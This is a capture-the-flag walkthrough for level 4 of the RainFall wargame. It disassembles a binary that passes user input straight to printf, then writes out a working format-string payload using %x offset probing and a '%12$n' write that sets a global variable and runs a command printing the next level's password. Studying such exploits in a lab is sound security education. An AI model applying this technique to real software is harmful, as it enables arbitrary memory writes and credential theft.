# Level 4

```gdb

(gdb) info func
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) 


Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
(gdb) 


(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.



```


It seems to be another format string attack, but more complicated.

Firstly the variable 'm' is a global, so we can find it in the .bss, but this binary use fgets, so we can't overflow, so its another format string attack.

```c
void p(char *param_1)

{
  printf(param_1);
  return;
}

void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) { // Once again we have to edit the m variable, but this time the address is way more far
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

So we must edit m again, but the address if kind big this time, we will need a big script for that.

We guess that we have to use the p function to make the attack.

So we are basically going to use the same script as before, but way more heavy.


the 'm' adresses is the following : 0x8049810 lets push it to the stack and point to it using %x.

```sh
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x %x %x %x %x'" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%x %x %x %x %x %x %x %x %x %x %x %x'" | ./level4

```

We ended up finding it at the 12's %x,

So we must write 11 x to point to m.

Now we must write enough character to write 0x1025544 into m, which is 16930116 in decimal

After some documentation, we can use '%16930116x' to write 16930116 in STDIN.


python -c "print '\x10\x98\x04\x08' + '%16930116x' + '%12\$n'" | ./level4

So here's what i changed, we still push our memory to the stack, this time instead of printing 11 %x, im using '%12$n' to direcly jump to the index of the pointer, which save us byte to substrace to the input.


Since we already wrote 4byte, we are going to substract 16930116 - 4 = 16930112.

And then we try

```sh                                                                                                                                                                                                                              (...)                                                                                                                                                                                                                                                                                                                                          b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```

A lot of bytes got wrote to stdin, but then the %n took this length and wrote it to our addresses, and entered the if which gaved us the flag.